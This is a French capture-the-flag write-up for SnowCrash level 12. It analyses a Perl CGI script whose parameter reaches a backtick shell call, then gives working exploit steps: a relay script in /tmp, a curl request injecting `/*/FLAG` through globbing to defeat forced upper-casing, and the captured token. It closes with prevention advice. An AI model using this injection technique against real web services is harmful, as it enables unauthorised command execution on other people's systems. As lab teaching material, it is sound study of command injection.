## SnowCrash - Level 12 - Injection de commande et contournement de casse (Regex/Globbing)

### 1. Analyse de l'existant

Dans ce niveau, nous avons accès à un script Perl nommé `level12.pl`. Ce script tourne en tant que service CGI sur le port **4646** de la machine locale.

### 2. Analyse du code source

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Le script récupère deux paramètres via une requête HTTP GET : `x` et `y`. La vulnérabilité se situe dans la fonction `t` :

```perl
sub t {
  $xx = $_[0]; # Reçoit le paramètre 'x'
  $xx =~ tr/a-z/A-Z/; # Transforme TOUT en MAJUSCULES
  $xx =~ s/\s.*//;    # Supprime tout ce qui suit le premier espace
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # Exécution via backticks
  # ...
}

```

**Points critiques :**

* **Exécution Shell :** La variable `$xx` est directement insérée dans une commande système entre backticks (``egrep ...``).
* **Contrainte de Casse :** Le script transforme systématiquement l'entrée en majuscules, ce qui empêche d'appeler directement des binaires comme `/bin/getflag`.
* **Filtre d'Espace :** Tout ce qui se trouve après un espace est supprimé, limitant les injections complexes.

### 3. Stratégie d'exploitation

L'objectif est d'exécuter `getflag` et de rediriger la sortie vers un fichier lisible. Pour contourner la transformation en majuscules, nous utilisons deux astuces :

1. **Le script relais :** Créer un fichier dans `/tmp` avec un nom en majuscules (ex: `/tmp/FLAG`) qui contient la commande en minuscules.
2. **Le Wildcard (Globbing) :** Utiliser le caractère joker `*` pour désigner le répertoire `/tmp/`. En envoyant `/*/FLAG`, le script transforme la chaîne en `/*/FLAG`, mais le shell, lors de l'exécution, résoudra le chemin vers `/tmp/FLAG` (car `/TMP/` n'existe pas, mais `/tmp/` oui).

### 4. Commandes exécutées

#### Étape 1 : Création du script relais

Nous créons un fichier qui exécutera la commande finale.

```bash
level12@SnowCrash:~$ echo "getflag > /tmp/token_12" > /tmp/FLAG
level12@SnowCrash:~$ chmod +x /tmp/FLAG
```

#### Étape 2 : Injection via Curl

Nous appelons le service web en injectant notre chemin via les backticks. Les backticks forcent le shell à exécuter `/*/FLAG` avant de passer le résultat à `egrep`.

```bash
level12@SnowCrash:~$ curl '127.0.0.1:4646/?x=`/*/FLAG`'
```

#### Étape 3 : Récupération du flag

Le script ayant été exécuté avec les privilèges de **flag12**, le fichier de sortie contient le token.

```bash
level12@SnowCrash:~$ cat /tmp/token_12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

### 5. Conclusion et Sécurité

Ce niveau illustre une **injection de commande** indirecte où une contrainte de formatage (mise en majuscules) est contournée grâce aux mécanismes de résolution de chemins du shell (globbing).

**Mesures de prévention :**

* **Éviter les appels système :** Préférer les fonctions natives de recherche dans un fichier (ex: ouvrir le fichier en Perl et boucler sur les lignes).
* **Échappement des entrées :** Si l'appel au shell est indispensable, utiliser des fonctions d'échappement pour empêcher l'interprétation des caractères spéciaux (```, `;`, `&`, `*`).
* **Désactiver l'exécution de scripts dans les répertoires temporaires :** Monter `/tmp` avec l'option `noexec`.
